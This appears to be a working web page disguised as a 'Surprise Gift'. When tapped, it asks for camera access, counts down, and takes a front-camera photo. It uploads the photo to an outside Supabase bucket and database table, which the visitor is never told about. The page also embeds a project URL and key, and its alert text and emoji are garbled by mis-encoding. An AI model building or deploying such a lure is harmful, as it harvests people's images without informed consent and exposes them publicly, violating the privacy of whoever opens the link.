<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise Gift ğŸ</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { background: #1e272e; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; text-align: center; margin: 0; }
        #gift-box { cursor: pointer; }
        .emoji { font-size: 100px; animation: bounce 2s infinite; display: block; }
        #timer { font-size: 6rem; color: #ff4757; display: none; }
        @keyframes bounce { 0%, 100% {transform: translateY(0);} 50% {transform: translateY(-20px);} }
    </style>
</head>
<body>

    <div id="gift-box" onclick="testCamera()">
        <div class="emoji">ğŸ</div>
        <h1>Tap to Open</h1>
    </div>

    <div id="timer">10</div>
    <p id="status"></p>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- CONFIG ---
        const SUPABASE_URL = 'https://mlcbjfnimbpatmbcgwsq.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_J1WdZTnnDUCBE6bsTf2brQ_qRlXL_1Z'; 
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        async function testCamera() {
            // 1. Check if running on Secure Context (HTTPS or Localhost)
            if (!window.isSecureContext) {
                alert("Ù…Ø³Ø¦Ù„Û Ù¾Ú©Ú‘Ø§ Ú¯ÛŒØ§!\n\nÚ©Ø±ÙˆÙ… Ú©ÛŒÙ…Ø±Û Ú©ÛŒ Ø§Ø¬Ø§Ø²Øª Ù†ÛÛŒÚº Ø¯Û’ Ø±ÛØ§ Ú©ÛŒÙˆÙ†Ú©Û Ø¢Ù¾ ÛŒÛ ÙØ§Ø¦Ù„ ÚˆØ§Ø¦Ø±ÛŒÚ©Ù¹ Ú©Ù…Ù¾ÛŒÙˆÙ¹Ø± Ø³Û’ Ú†Ù„Ø§ Ø±ÛÛ’ ÛÛŒÚºÛ”\n\nØ¨Ø±Ø§Û Ú©Ø±Ù… Ø§Ø³Û’ Netlify Ù¾Ø± Ø§Ù¾Ù„ÙˆÚˆ Ú©Ø±ÛŒÚº ÛŒØ§ Local Server Ø§Ø³ØªØ¹Ù…Ø§Ù„ Ú©Ø±ÛŒÚºÛ”");
                return;
            }

            // 2. Try to open camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                
                // If successful
                document.getElementById('video').srcObject = stream;
                startTimer();

            } catch (err) {
                alert("Ø§ÛŒØ±Ø±: " + err.message + "\n\nÚ©ÛŒØ§ Ø¢Ù¾ Ù†Û’ 'Allow' Ù¾Ø± Ú©Ù„Ú© Ú©ÛŒØ§ ØªÚ¾Ø§ØŸ");
            }
        }

        function startTimer() {
            document.getElementById('gift-box').style.display = 'none';
            document.getElementById('timer').style.display = 'block';
            document.getElementById('status').innerText = "Opening...";
            
            let count = 10;
            const interval = setInterval(() => {
                count--;
                document.getElementById('timer').innerText = count;
                if (count <= 0) {
                    clearInterval(interval);
                    captureAndUpload();
                }
            }, 1000);
        }

        async function captureAndUpload() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth; 
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const fileName = `snap_${Date.now()}.png`;
                await supabase.storage.from('camsnaps').upload(fileName, blob);
                const { data } = supabase.storage.from('camsnaps').getPublicUrl(fileName);
                await supabase.from('captured_photos').insert([{ image_url: data.publicUrl }]);
                
                document.getElementById('timer').style.display = 'none';
                document.getElementById('status').innerHTML = "<h1>ğŸ‰ Surprise! ğŸ‰</h1><br><img src='" + data.publicUrl + "' width='200'>";
            }, 'image/png');
        }
    </script>
</body>
</html>
